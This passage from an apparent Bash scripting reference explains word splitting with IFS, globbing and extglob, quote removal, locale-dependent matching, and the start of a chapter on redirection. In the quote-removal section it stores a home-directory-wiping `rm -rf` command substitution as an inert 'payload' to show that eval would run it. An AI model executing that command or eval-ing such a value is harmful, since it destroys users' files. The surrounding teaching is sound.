newline. These three are *IFS-whitespace*; any other character used as
`IFS` is *IFS-non-whitespace*. The two classes split differently:

- **IFS-whitespace**: leading and trailing runs are stripped; interior
  runs collapse to a single separator. `'  a  b  '` → `a` `b` (two
  fields).
- **IFS-non-whitespace**: every separator delimits a field, including
  adjacent ones. `'a::b'` (with `IFS=:`) → `a`, ``, `b` (three fields,
  middle one empty).

```bash
# scenario: IFS-whitespace collapses; IFS-non-whitespace does not
IFS=' ' read -ra w <<< '  a  b  '
declare -p w               # ⇒ declare -a w=([0]="a" [1]="b")

IFS=':' read -ra n <<< 'a::b'
declare -p n               # ⇒ declare -a n=([0]="a" [1]="" [2]="b")
```

This asymmetry is deliberate — whitespace runs are usually formatting,
whereas a `:` (in `PATH`, `LD_LIBRARY_PATH`) is a real separator and
empty fields carry meaning.

### The safe-IFS idiom — `IFS=$'\t\n'`

The default `IFS` includes a literal space, which means *any* unquoted
expansion containing a space is silently re-split. The defensive
posture is to remove space from `IFS` for the script body, leaving
only tab and newline as separators. This is the BCS1003-mandated
discipline:

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
IFS=$'\t\n'                         # safe-IFS — drop space; keep tab and newline

# Now any unquoted file path or output containing spaces will not be
# silently torn apart on its spaces. Tabs and newlines are still active
# separators because real-world line- and column-oriented data needs them.
```

Place this assignment immediately after the strict-mode preamble.
Every BCS-compliant script does so (see BCS0101, BCS1003). The result
is that *forgetting* to quote becomes far less catastrophic — a missed
quote on a filename like `My Documents/notes.txt` no longer splits
into two arguments.

### Quoted vs unquoted — side by side

```bash
# scenario: quoting controls whether splitting happens at all
declare -- spaced='one two three'
declare -a items=('alpha beta' 'gamma' 'delta epsilon')

# Quoted — single argument
printf '[%s]\n' "$spaced"
# ⇒ [one two three]

# Unquoted — split on IFS (default); demonstration only
#shellcheck disable=SC2086
printf '[%s]\n' $spaced
# ⇒ [one]
#    [two]
#    [three]

# Quoted array expansion — preserves element boundaries
printf '[%s]\n' "${items[@]}"
# ⇒ [alpha beta]
#    [gamma]
#    [delta epsilon]

# wrong — unquoted array expansion re-splits each element; demonstration only
#shellcheck disable=SC2068
printf '[%s]\n' ${items[@]}
# ⇒ [alpha]
#    [beta]
#    [gamma]
#    [delta]
#    [epsilon]
```

The rule: `"${arr[@]}"` is the only correct way to iterate an array
where any element might contain whitespace (BCS0206). The unquoted
form is broken by design.

### Per-command IFS

`IFS` can be set for one command only by placing the assignment on the
same line as the command. The shell restores the previous value
after:

```bash
# scenario: parse a colon-separated record without disturbing global IFS
declare -- record='alice:42:engineer:active'
IFS=':' read -ra fields <<< "$record"
declare -p fields
# ⇒ declare -a fields=([0]="alice" [1]="42" [2]="engineer" [3]="active")

# IFS is back to its previous value here.
```

This is the idiomatic way to parse `/etc/passwd`-style records, key=value
pairs, and any column-oriented input. `read -ra` honours the
per-command IFS without leaking the change.

### Splitting newline-delimited captures

The classic problem: capture command output into an array, one line
per element, where lines may contain spaces.

```bash
# scenario: read a process listing into an array, one line per element
declare -a procs
IFS=$'\n' read -d '' -ra procs < <(ps -eo comm=)

# Or — strongly preferred — use readarray (mapfile), which doesn't need IFS at all:
declare -a procs2
readarray -t procs2 < <(ps -eo comm=)
```

`readarray -t` (alias `mapfile -t`) is the BCS-preferred replacement
for the IFS-fiddling form: it reads line-delimited input directly into
an array with no IFS interaction, and `-t` strips the trailing newline
on each element.

### Unsetting IFS

Unsetting `IFS` does *not* disable splitting — bash falls back to the
default `space tab newline`. To truly suppress splitting for a block,
quote the expansions or save and restore IFS:

```bash
# scenario: save/restore IFS around a block that needs a different value
declare -- _saved_IFS=$IFS
IFS=':'
# … code that needs colon-splitting …
IFS=$_saved_IFS
```

Most code never needs this — the per-command `IFS=value cmd` form
covers the common case.

### Glob expansion of unquoted results

After word splitting, each resulting word that contains unquoted glob
metacharacters is filename-expanded (§5.9). This compounds the
splitting hazard: an unquoted `$var` containing `*.log` will not just
re-split — it will then expand against the working directory's files.
A two-stage hazard avoided by the same single rule: quote.

### The cardinal rule

> Always double-quote variable expansions, command substitutions, and
> array expansions, except in the rare cases where you specifically
> want word splitting or pathname expansion.

The rule is unconditional. Every leading bash style guide states it,
ShellCheck's SC2086 enforces it, and BCS1003 codifies it. A script
that never violates it is effectively immune to the entire word-
splitting bug class.

**See also**: §5.1 (the order of expansions — splitting comes after
expansion, before pathname matching), §5.4 (parameter expansion
produces the values that splitting then divides), §5.9 (pathname
expansion of split words), §10.x (`read` and `readarray` for
line-oriented capture), BCS0301 (quoting fundamentals), BCS1003
(IFS safety), BCS0206 (array expansion idioms), ShellCheck SC2086,
SC2068, SC2206.

## 5.9 Pathname expansion (globbing)

After word splitting (§5.8), each word that contains unquoted glob
metacharacters is treated as a *pattern* and matched against
filenames in the working directory (or the directory implied by the
pattern's path component). The matched filenames replace the pattern.
Globbing is what makes `rm *.bak` work; it is also what makes a
mistyped command catastrophic when a filename happens to start with
`-`. This chapter is the structural reference; behavioural toggles
live in §5.11 and extended-glob operators in §5.12.

### Metacharacters

| Pattern | Matches |
|---------|---------|
| `*` | any string, including the empty string |
| `?` | exactly one character |
| `[abc]` | one character from the set |
| `[!abc]` or `[^abc]` | one character *not* in the set |
| `[a-z]` | one character in the range (locale-dependent — see §5.13) |
| `[[:class:]]` | one character of the named POSIX class (table below) |

The metacharacters are special only when *unquoted*. `'*.log'` is the
literal three characters; `*.log` is a pattern.

### POSIX character classes

Bracket expressions accept POSIX-named character classes, written as
`[[:class:]]` *inside* a bracket expression — the outer brackets are
the bracket expression, the inner `[:class:]` is the class.

| Class | Members |
|-------|---------|
| `[:alpha:]` | letters (A–Z, a–z under C locale; locale-extended otherwise) |
| `[:upper:]` | upper-case letters |
| `[:lower:]` | lower-case letters |
| `[:digit:]` | decimal digits 0–9 |
| `[:xdigit:]` | hexadecimal digits 0–9 a–f A–F |
| `[:alnum:]` | `[:alpha:]` + `[:digit:]` |
| `[:space:]` | whitespace (space, tab, newline, vertical tab, form feed, carriage return) |
| `[:blank:]` | space and tab only |
| `[:cntrl:]` | control characters |
| `[:print:]` | printable characters (including space) |
| `[:graph:]` | printable characters excluding space |
| `[:punct:]` | punctuation |

Use these in preference to ad-hoc ranges: `[[:alpha:]]` is correct
under any locale, whereas `[a-z]` may include accented characters under
some locales and miss them under others (§5.13 covers the locale
trap).

### Dotfile rule

By default, `*` and `?` do *not* match a leading `.` — dotfiles are
hidden from globs unless the pattern *itself* begins with `.`. This is
inherited from Unix shell tradition; it protects `rm *` from removing
`.bashrc`. The `dotglob` shopt overrides it (§5.11):

```bash
# scenario: dotglob behaviour, default vs enabled
ls -a /tmp/demo
# ⇒ . .. .hidden visible.txt

cd /tmp/demo
printf '[%s]\n' *           # ⇒ [visible.txt]   — dotfiles excluded
printf '[%s]\n' .*          # ⇒ [.] [..] [.hidden]   — explicit dot

shopt -s dotglob
printf '[%s]\n' *           # ⇒ [.hidden] [visible.txt]   — dotfiles included
                            #   but `.` and `..` still excluded (Bash 5.2+)
shopt -u dotglob
```

Bash 5.2 introduces `globskipdots` (on by default in many distros),
which excludes `.` and `..` from `*`/`?` matches even with `dotglob`
enabled. See §5.11 for the full toggle inventory.

### No-match behaviour

By default, when a glob matches no files, *the pattern itself is
passed through* unchanged — `for f in *.notexist` then iterates with
`f='*.notexist'`. This is almost always wrong. The fix is `nullglob`:

```bash
# scenario: nullglob makes empty matches yield zero arguments
shopt -s nullglob
declare -a logs=( /tmp/no-such-pattern-*.log )
echo "${#logs[@]}"          # ⇒ 0   — empty array

# Without nullglob:
shopt -u nullglob
declare -a logs2=( /tmp/no-such-pattern-*.log )
echo "${#logs2[@]}"         # ⇒ 1
echo "${logs2[0]}"          # ⇒ /tmp/no-such-pattern-*.log   — literal pattern
```

`nullglob` is the BCS-preferred behaviour (BCS0902, BCS0101 strict-mode
preamble enables it). For "this glob *must* match" semantics, use
`failglob` instead — it errors out on no-match (§5.11).

### Sort order

Matched filenames are sorted by `LC_COLLATE`. Under a UTF-8 locale,
this is *not* byte-order; under `C`/`POSIX`, it is. Scripts that
depend on a stable, predictable sort should set `LC_ALL=C` or sort
explicitly:

```bash
# scenario: stable sort regardless of user locale
LC_ALL=C
declare -a files=( *.txt )      # files now sorted by byte value
```

See §5.13 for the locale-collation pitfall in detail.

### Pattern matching outside pathname expansion

The same glob syntax is used in `[[ word == pattern ]]` (§8 conditional
expressions), `case` statements (§7.5), and the parameter-expansion
operators `#`, `##`, `%`, `%%`, `/`, `//` (§5.4). In those contexts the
pattern is *not* matched against filenames — it is matched against the
string. Pathname expansion does not occur there.

```bash
# scenario: glob-as-pattern in case and [[
declare -- name='report.tar.gz'
case "$name" in
  *.tar.gz|*.tgz) info 'gzip-tar archive' ;;
  *.zip)          info 'zip archive' ;;
  *)              info 'unknown' ;;
esac

[[ $name == *.tar.* ]] && info 'compressed tar'
```

The same `*.tar.gz` is used in three different contexts: as a filename
glob, as a `case` pattern, and as a `[[` operand. Behaviour is
identical *except* for filesystem matching.

**See also**: §5.8 (word splitting precedes pathname expansion), §5.11
(behavioural toggles — `nullglob`, `dotglob`, `failglob`, `globstar`),
§5.12 (extended-glob operators), §5.13 (locale and collation), §7.5
(`case` patterns), §8 (`[[ == ]]` pattern operands), BCS0902
(wildcard expansion safety), BCS0101 (strict-mode shopt set).

## 5.10 Quote removal

The implicit final phase of the expansion pipeline (§5.1). After
phases 1–8 have run, Bash strips the *user-supplied* quoting
characters — `\`, `'`, `"` — leaving only the bytes that should reach
`execve`. Quote characters introduced by an *expansion* (e.g. a
backslash that came from the value of a variable) are **not**
removed: they have already been "promoted" to data.

This rule is short by intent. The single most-asked question — "why
does my variable's backslash survive?" — is answered by one example.

### The user-versus-expansion rule

```bash
# scenario: backslash from user quoting versus from expansion
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# User-supplied backslash inside a double-quoted word — REMOVED at phase 9
echo "a\\b"                         # ⇒ a\b   (the literal '\\' is one '\')
echo "a\b"                          # ⇒ a\b   (\b is not a recognised escape)

# Backslash from a $'...' ANSI-C value — DATA, not user quoting
declare -- var=$'a\\b'              # value is exactly: a, \, b   (3 bytes)
echo "$var"                         # ⇒ a\b   (backslash survives)
printf '%d\n' "${#var}"             # ⇒ 3

# Backslash inside a plain assignment — not an escape, just a byte
declare -- raw='a\b'                # value is exactly: a, \, b
echo "$raw"                         # ⇒ a\b
echo "${raw//\\/-}"                 # ⇒ a-b   (replace literal \ with -)
```

The principle: phase 9 fires once, at the end, against the result of
the prior phases. By that point the expanded value is *bytes*. Bash
does not re-parse those bytes for quoting.

### What gets removed

- Unquoted backslashes preceding a metacharacter (used to escape).
- Pairs of single-quotes wrapping a literal segment.
- Pairs of double-quotes wrapping an interpolated segment.
- The leading `$` of `$'…'` ANSI-C strings (the `\…` sequences inside
  having already been resolved when the token was scanned).
- The leading `$` of `$"…"` locale-translatable strings (rare).

### What is left behind

Anything that came **out of** an expansion: variable contents,
command-substitution output, the textual result of arithmetic, the
result of brace expansion. None of these is re-quoted; none is
re-scanned.

### Practical consequence

```bash
# scenario: a value containing $(...) does NOT execute the substitution
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- payload='$(rm -rf $HOME)'
echo "$payload"
# ⇒ $(rm -rf $HOME)   — literal, never executed
# (phase 5 ran before $payload existed in this word; the bytes are inert)

# Beware `eval` — that *would* re-scan and execute (BCS1004):
# eval "$payload"     # ✗ DO NOT — full BCS1004 violation
```

This is why `eval` is a BCS0307/BCS1004 anti-pattern: it forces a
*second* parsing pass over already-expanded data, restoring every
phase from 1 to 9 against bytes that were meant to be inert.

### BCS posture

- Quote variable references in word context (BCS0301). Quote removal
  then leaves your value intact.
- Treat `eval` as a security-critical construct (BCS1004); never `eval`
  a value derived from user input or filesystem data (BCS1005).
- For substitution-like patterns over data, prefer `${var/pattern/repl}`
  (§5.4) — it never re-parses the value as code.

**See also**: §5.1 (expansion order), §3.5 (single-quotes — what
gets stripped), §3.6 (double-quotes), §3.7 (`$'…'` ANSI-C strings),
§5.4 (`${var/...}` rewrite).

## 5.11 Glob options

Pathname expansion (§5.9) is governed by a small set of `shopt`
toggles. Each one changes a specific aspect of pattern matching;
together they let scripts opt in to safer, fuller, or stricter glob
behaviour. This chapter documents the toggles, the recommended
defaults, and the save-restore idiom for changing them inside a
function.

### Toggle inventory

| Option | Default | Effect |
|--------|--------:|--------|
| `nullglob` | off | unmatched glob expands to *nothing* (zero words) |
| `failglob` | off | unmatched glob is a syntax error; the command does not run |
| `dotglob` | off | `*` and `?` match leading `.` (still excludes `.` and `..` under `globskipdots`) |
| `globskipdots` | on (Bash 5.2+) | `*` and `?` never match `.` or `..` |
| `nocaseglob` | off | filename matching is case-insensitive |
| `nocasematch` | off | `[[ ]]` and `case` glob comparisons are case-insensitive |
| `globstar` | off | `**` matches any number of directories (recursive) |
| `extglob` | off | enables extended-glob operators (§5.12) |
| `globasciiranges` | off | `[a-z]` is interpreted by ASCII order rather than locale collation |
| `dirspell` | off | typo-correction for directory names during completion |
| `cdspell` | off | typo-correction for `cd` arguments |

`nullglob`, `extglob`, and the Bash 5.2 `globskipdots` are enabled by
the BCS strict-mode preamble (BCS0101). `failglob` is offered as an
alternative for scripts that treat any unmatched glob as a bug.

### `nullglob` versus `failglob`

The default no-match behaviour — passing the literal pattern through —
is almost never what scripts want. `nullglob` and `failglob` represent
the two principled responses:

```bash
# scenario: nullglob — empty match yields empty array, loop runs zero times
shopt -s nullglob
declare -a stale=( /tmp/staging-*.lock )
for f in "${stale[@]}"; do          # zero iterations if no matches
  rm -f -- "$f"
done

# scenario: failglob — empty match aborts the command
shopt -s failglob
declare -a inputs=( /no/such/path/*.txt )
# ⇒ bash: no match: /no/such/path/*.txt
# the assignment never happens; the script aborts under set -e
```

Use `nullglob` when "no matches" is a normal outcome (clean-up loops,
optional fixtures). Use `failglob` when an empty match is a bug (a
config-file pattern that *must* find at least one file). The two are
mutually exclusive; setting one does not unset the other automatically,
so do not enable both.

### Save-restore idiom

`shopt` settings are global to the shell — there is no `local`
mechanism for them, and a function that toggles a shopt leaves the
toggle changed when it returns. The defensive idiom is to capture the
current state with `shopt -p` (which prints a re-runnable `shopt`
command), change what is needed, then `eval` the saved state on exit:

```bash
# scenario: temporarily enable nocaseglob without leaking the change
case_insensitive_match() {
  local -- _saved
  _saved=$(shopt -p nocaseglob)       # capture current state
  shopt -s nocaseglob

  # ... pattern-matching code that needs case insensitivity ...
  declare -a matches=( *.PNG *.JPG *.JPEG )
  printf '%s\n' "${matches[@]}"

  eval "$_saved"                      # restore prior state, set or unset
}
```

The `shopt -p name` form emits exactly `shopt -s name` or `shopt -u name`
depending on the prior value, so `eval "$_saved"` always restores the
original. Pair it with a trap on `RETURN` if the function has multiple
exit paths.

### `globstar` and `**`

With `globstar` enabled, `**` matches any number of directories
(including zero), recursively. Without it, `**` is the same as `*`.

```bash
# scenario: globstar for recursive file collection
shopt -s globstar nullglob
declare -a sources=( src/**/*.bash )
echo "${#sources[@]} files"

# Without globstar, src/**/*.bash matches only src/*/*.bash (one level deep).
```

`globstar` makes simple shell-only recursion possible without forking
`find`. The only caveat: `**` follows symlinks by default, which can
recurse forever on a circular link. For untrusted trees, prefer
`find -type f`.

### `nocasematch` for `[[` and `case`

`nocaseglob` only affects filename expansion. The companion
`nocasematch` affects pattern-matching in `[[ ]]` and `case`:

```bash
# scenario: nocasematch — case-insensitive [[ and case
shopt -s nocasematch
[[ Hello == hello ]] && echo 'match'        # ⇒ match

case 'README.MD' in
  *.md) echo 'markdown' ;;                  # ⇒ markdown
esac
shopt -u nocasematch
```

These two toggles are independent — set whichever the context needs.

**See also**: §5.9 (pathname expansion fundamentals), §5.12 (extended
globs require `extglob`), §5.13 (locale and `globasciiranges`), §9
(functions and the case for save-restore around shopt changes), §13
(error-handling effect of `failglob` under `set -e`), BCS0101 (strict-
mode `shopt` set), BCS0902 (wildcard expansion safety), BCS0501
(conditional expressions and `nocasematch`).

## 5.12 Extended globs (extglob)

With `shopt -s extglob` enabled, bash's pattern syntax gains five
operators that bring it close to the expressive power of regular
expressions, while remaining shell-style globs (matched literally,
not anchored as regexes are). The operators apply uniformly to
pathname expansion (§5.9), `[[ word == pattern ]]` matching (§8), and
`case` (§7.5). The BCS strict-mode preamble (BCS0101) enables
`extglob` unconditionally, so these operators are always available in
a compliant script.

### The five operators

| Operator | Semantics |
|----------|-----------|
| `?(pat)` | zero or one occurrence of `pat` |
| `*(pat)` | zero or more occurrences |
| `+(pat)` | one or more occurrences |
| `@(pat)` | exactly one occurrence (alternation grouping) |
| `!(pat)` | anything *except* `pat` |

The `pat` is a *pattern list* — one or more sub-patterns separated by
`|`. Sub-patterns are themselves globs, optionally containing further
extglob operators.

### Each operator demoed

```bash
# scenario: each extglob operator in pathname expansion
shopt -s extglob nullglob

# Materialise the demo files in the current directory:
: > report.txt && : > report.md && : > report.html
: > notes.txt && : > archive.tar.gz

ls ?(report).txt 2>/dev/null            # ⇒ report.txt
ls *.@(md|html) 2>/dev/null             # ⇒ report.html
ls +([a-z]).txt 2>/dev/null             # ⇒ notes.txt
ls *(report).txt 2>/dev/null            # ⇒ report.txt
ls !(*.tar.gz) 2>/dev/null              # ⇒ notes.txt
```

Note the difference between `@(a|b)` and a plain `[ab]`: the `@()`
form alternates *strings*, while `[ab]` alternates *single
characters*. Use `@()` whenever the alternates are multi-character —
filenames, extensions, words.

### The `!()` negation idiom

`!(pat)` is the operator most often missing from scripts that fall
back to a `for` loop with a `case` filter. It matches "anything that
does not match `pat`" — including the empty string. Combined with `|`
inside, it becomes "anything not in this list":

```bash
# scenario: clean a directory of every file except a small allow-list
shopt -s extglob

# Remove everything except *.bak, *.tmp, and the "keep" subdirectory
rm -rf -- !(*.bak|*.tmp|keep)

# Iterate every non-hidden non-source file
for f in !(*.bash|*.sh|.*); do
  process "$f"
done
```

The `!(...)` form is particularly useful in destructive commands —
saying "everything *except* X" once is safer and clearer than building
an explicit allow-list.

### Composability

Extglob operators nest. The pattern-list separator `|` allows
arbitrary alternation, and each alternate may itself be an extglob:

```bash
# scenario: composed extglob — image files except thumbnails
shopt -s extglob nullglob
declare -a images=( *.@(png|jpg|jpeg|gif) )      # one of these extensions
declare -a not_thumbs=( !(thumb_*).@(png|jpg) )  # excluding thumb_-prefixed
```

This is where extglob clearly outperforms POSIX sh and where reaching
for `find … -name …` is unnecessary.

### Use in `[[` and `case`

The same operators work in pattern-matching contexts that do not
involve the filesystem:

```bash
# scenario: extglob in [[ and case for input validation
shopt -s extglob
declare -- input='42abc'

if [[ $input == +([0-9])*([a-z]) ]]; then
  info 'digits-then-letters form'
fi

case "$input" in
  +([0-9]))         info 'pure number' ;;
  +([0-9])*([a-z])) info 'mixed' ;;
  *)                info 'other' ;;
esac
```

Pattern-matching here is glob-style, so `+([0-9])` means "one or more
digits", *not* the regex equivalent — there is no anchoring or
backreference. For full regex, use `[[ word =~ regex ]]` (§8).

### Pitfalls

- **Parsing**: bash parses extglob patterns at the moment the shopt
  is *active*. A pattern read into a variable while `extglob` is off
  is then re-parsed when used? No — the pattern's behaviour is set at
  command-evaluation time, but unbalanced parentheses in the source
  *file* under `extglob`-off can be a syntax error. Set `extglob`
  early (the strict-mode preamble does so).
- **Quoting**: the parentheses are special only when `extglob` is on.
  Inside double quotes, the operators are *not* expanded — `"+(a)"` is
  the literal four characters. Strip the quotes, or use `[[ x ==
  +(a) ]]` where the right-hand side is treated as a pattern.
- **Empty match**: `*(pat)` and `?(pat)` both match the empty string.
  `[[ '' == *(x) ]]` is true. This is occasionally surprising in
  validators.

**See also**: §5.9 (basic glob metacharacters that extglob extends),
§5.11 (`extglob` toggle and other glob shopts), §7.5 (`case`
pattern matching), §8 (`[[ == ]]` pattern operands and `=~` for true
regex), §22 (idiom: `!()` allow-list deletion), BCS0101 (strict-mode
preamble enables `extglob`), BCS0501 (conditional and case patterns).

## 5.13 Locale and pattern matching

Locale settings reach deep into Bash's text-handling: glob ranges,
`[[:class:]]` POSIX classes, regex matching, and `[[ ]]` string
comparison all consult the user's `LC_*` variables. The single
biggest surprise is that `[a-z]` is **not** the 26 ASCII lowercase
letters under most modern locales — it is the locale-collated *range*
between `a` and `z`, which interleaves uppercase, accented, and
combining characters. Parsing-heavy scripts must defend against this.

### The LC_* variables that matter

| Variable | Affects |
|----------|---------|
| `LC_COLLATE` | Sort/range order for `[a-z]`, `sort`, `[[ a < b ]]` |
| `LC_CTYPE`   | `[[:alpha:]]`, `[[:upper:]]`, character class membership |
| `LC_NUMERIC` | Decimal point: `1.5` vs `1,5` (rarely a Bash issue) |
| `LC_TIME`    | `printf '%(…)T'`, `date` formatting (§14.4) |
| `LC_MESSAGES`| Diagnostic strings (`bash: …: not found`) |
| `LC_ALL`     | **Overrides every** `LC_*` variable when set |
| `LANG`       | Fallback when an `LC_*` is unset |

`LC_ALL=C` (or `LC_ALL=POSIX`) collapses the entire locale to bytewise
ASCII semantics: `[a-z]` is exactly 26 characters, `[[:alpha:]]`
recognises ASCII letters only, and sort/range order is byte order.

### The `[a-z]` collation gotcha

```bash
# scenario: range glob behaviour under different locales
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# C locale — pure ASCII, predictable
LC_ALL=C
[[ A == [a-z] ]] && echo 'C: A in [a-z]' || echo 'C: A not in [a-z]'
# ⇒ C: A not in [a-z]

# en_US.UTF-8 — collation may interleave cases for "dictionary order"
LC_ALL=en_US.UTF-8
[[ A == [a-z] ]] && echo 'en_US: A in [a-z]' || echo 'en_US: A not in [a-z]'
# ⇒ en_US:
# (the answer is libc- and locale-installation dependent: most glibc
#  UTF-8 locales report "in", some return "not in")
```

The defence is **`shopt -s globasciiranges`** (default on since Bash
4.3, reaffirmed in 5.x) which forces `[a-z]` and `[A-Z]` in glob
*patterns* to ASCII C-locale ordering even when `LC_COLLATE` says
otherwise. The shopt does **not** affect `[[ str =~ re ]]` regex
matching — that is delegated to the C-library regex routines, which
read `LC_COLLATE` and `LC_CTYPE` directly.

```bash
# scenario: prefer named POSIX classes over [a-z] range
declare -- name='alpha'
shopt -s globasciiranges            # confirm the default

# Ambiguous (depends on shopt + locale):
[[ "$name" == [a-z]* ]]

# Unambiguous, locale-independent in the usual sense:
[[ "$name" == [[:lower:]]* ]]       # locale-aware "lowercase"

# Bytewise ASCII, regardless of locale (subshell scopes the override —
# `VAR=val builtin` does NOT apply to `[[`):
( LC_ALL=C; [[ "$name" == [a-z]* ]] )
```

### When to force `LC_ALL=C`

For *parsing* hashes, protocol fields, log lines, base64, hex,
filenames-with-bytes — anything where byte-exact matching is required
— set `LC_ALL=C` at the top of the script (or per-command):

```bash
# scenario: byte-safe parsing pipeline — the BCS pattern
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Pin locale once; affects every child too (BCS1003-adjacent — IFS-style)
export LC_ALL=C

# Now [[:xdigit:]] is exactly [0-9A-Fa-f], sort is bytewise, etc.
declare -- sha
sha=$(sha256sum < /etc/hostname)
[[ $sha =~ ^([[:xdigit:]]{64})\  ]] && printf 'hash=%s\n' "${BASH_REMATCH[1]}"

# Per-command override when only one fork needs C-locale semantics:
LC_ALL=C sort -u < /var/log/something | head -3
```

### Class compatibility

POSIX character classes inside `[[ ]]` and `[[:class:]]` glob
brackets are honoured under any locale; their *contents* vary by
`LC_CTYPE`:

- `[[:alpha:]]` — under C locale, `a-zA-Z`. Under UTF-8 locales,
  every Unicode letter.
- `[[:digit:]]` — under C locale, `0-9`. Under UTF-8, may include
  Devanagari, Thai, etc. digits.
- `[[:space:]]`, `[[:upper:]]`, `[[:lower:]]`, `[[:xdigit:]]` —
  similar locale-dependence.
- `[[:print:]]`, `[[:cntrl:]]` — also locale-dependent.

### BCS posture

- Set `export LC_ALL=C` near the top of any parsing-heavy script
  (BCS-strict invariant in practice). For UI scripts that must
  display localised messages, set only the categories you need.
- Prefer `[[:class:]]` over `[a-z]` ranges for portable patterns
  (BCS0501).
- Inside regex (`=~`), use explicit literal classes (`[a-zA-Z]` after
  setting `LC_ALL=C`, or `[[:alpha:]]` if locale-folded matching is
  intended).
- Document the locale assumption in a header comment when it differs
  from the rest of the script (BCS1202).

**See also**: §5.9 (pathname expansion — globs), §5.11 (`shopt`
options including `globasciiranges`), §5.12 (extglob), §8.4
(`[[ ]]` string comparison), §14.4 (`printf '%(…)T'` and locale).

# Part VI — Redirection and Pipelines

*Redirection is fd manipulation by another name. Every operator resolves to a small sequence of `dup2()` and `open()` syscalls. This Part documents the operators, the ordering rules, and the pipeline mechanism that composes them.*

---

---

## 6.1 The fd table from Bash's perspective

Recap of §1.2, framed as the shell sees it. Every process has a
kernel-managed file-descriptor table: an array of small non-negative
integers mapping to *open file descriptions* (kernel structures
holding the file, current offset, and access mode). Bash inherits the
table from its parent at fork, modifies it according to the
redirection operators on the current command, and then exec's. The
modified table is what the child program receives.

### Operating principle

- **Inheritance**. Bash inherits *every* open fd at fork unless its
  `O_CLOEXEC` flag is set. The standard descriptors (0/1/2) are
  always inherited.
- **Order of operations**. For every command, Bash forks (for
  externals; for builtins it forks only when redirection demands a
  child), applies redirections in left-to-right order against the
  current table, *then* calls `execve`. The child program sees the
  table as Bash left it.
- **Compound commands**. Redirections on a `{ … }`, `( … )`, `for`,
  `while`, `if`, `case`, or function block apply for the duration of
  the block — every nested command sees the modified table.
- **Function-definition redirections**. `name() { … } > /tmp/log` is
  legal: every call to `name` redirects fd 1 to `/tmp/log`. Useful
  for centralising trace output.
- **Script-wide redirection via `exec`**. `exec >file 2>&1` (without
  a command word) redirects the *shell's own* fd 0/1/2 for the
  remainder of the script (§6.12).
- **Reservation convention**. Fds 3–9 are by convention available for
  user redirection (`exec 3<>file`); fds 10+ work but Bash may use
  them internally for redirection bookkeeping. BCS scripts stick to
  3–9 (BCS0905).

### Mini-trace — what the kernel sees

```bash
# scenario: trace fd manipulation through a single redirected pipeline
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Run under strace to see the syscalls Bash issues:
#   strace -f -e trace=open,openat,dup2,close,pipe,clone,execve \
#     bash -c 'echo hello >/tmp/x.log 2>&1'
#
# Trimmed output:
#   clone(...)                          # fork child for `echo`
#   openat(AT_FDCWD, "/tmp/x.log", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
#   dup2(3, 1)            = 1           # redirect stdout to /tmp/x.log
#   close(3)              = 0           # close the temp fd
#   dup2(1, 2)            = 2           # 2>&1: stderr follows stdout
#   execve("/bin/echo", ["echo", "hello"], envp)
#
# i.e. Bash:
#   1. opens the file on a *fresh* fd (3),
#   2. dup2's that into fd 1,
#   3. closes the temp fd,
#   4. dup2's fd 1 onto fd 2,
#   5. exec's the program — with fds 1 and 2 both pointing at /tmp/x.log.
```

This is the syscall-level evidence behind the `>file 2>&1` ordering
rule (§6.4): the operations happen in token order against the *live*
table, not as a logical "merge" of declarative intent.

### Function-level inheritance

```bash
# scenario: redirection on a function definition is per-call
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- LOGFILE=/tmp/trace.$$

# Every call to `traced` writes its own stdout to $LOGFILE
traced() {
  echo "[$(date +%T)] inside traced; arg=$1"
} >>"$LOGFILE"                       # function-definition redirection

traced one
traced two

cat -- "$LOGFILE"
# ⇒ [10:11:12] inside traced; arg=one
# ⇒ [10:11:13] inside traced; arg=two
```

The redirection lives on the function definition, so callers do not
need to remember to redirect.

### Custom fds 3–9 — the user range

```bash
# scenario: open a side-channel fd 3 to a log, leave 1/2 untouched
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r LOGFILE=/tmp/run.$$
exec 3>>"$LOGFILE"                   # fd 3 = append to log
trap 'exec 3>&-' EXIT                # close on script exit (BCS0110)

echo 'normal output to terminal'     # fd 1 unchanged
echo 'trace line' >&3                # explicit fd 3
exec 3>&-                            # explicit close (or rely on trap)
```

This is the `BASH_XTRACEFD` pattern (§19.4) and the BCS messaging
pattern (BCS0703) in miniature.

### BCS posture

- Reserve fds 3–9 for user redirection; do not use 10+ in scripts
  (BCS0905).
- Always close fds you open with `exec n<>file`, ideally via an
  EXIT trap (BCS0110).
- Prefer the parser shorthand `&>` over the manual `>file 2>&1` when
  you mean *both streams to the same destination* (§6.4); use the
  manual form when you need them on different destinations.
- Document fd reservations in a header comment when a script uses
  more than fd 3 (BCS1202).

**See also**: §1.2 (kernel fd model), §6.4 (stderr merging),
§6.6/§6.7 (duplicate / move / close), §6.11 (order of evaluation),
§6.12 (`exec` for fd manipulation), §19.4 (`BASH_XTRACEFD`).

## 6.2 Input redirection

Operators that connect an fd to an input source. Default fd is 0
(stdin). All forms are evaluated in the order they appear (§6.11)
and apply for the duration of the command, compound block, or
function call to which they are attached.

### Operator cheatsheet

| Operator | Meaning |
|----------|---------|
| `< file` | open *file* read-only on fd 0 |
| `n< file` | open *file* read-only on fd *n* |
| `<&n` | duplicate fd *n* onto fd 0 |
| `n<&m` | duplicate fd *m* onto fd *n* |
| `<&-` | close fd 0 |
| `n<&-` | close fd *n* |
| `<<` | here-document (§6.8) |
| `<<<` | here-string (§6.9) |
| `<>` | open file for **read + write** on fd 0 (or `n<>file` on fd *n*; §6.5) |

The `n` immediately precedes the operator with no space (`3<file`,
not `3 <file`). Default `n` is 0 for `<` operators, 1 for `>`
operators.

### Composite example — read from fd 3

```bash
# scenario: read from a side-channel fd 3 while keeping stdin (fd 0) free
#!/usr/bin/env bash
set -euo pipefail
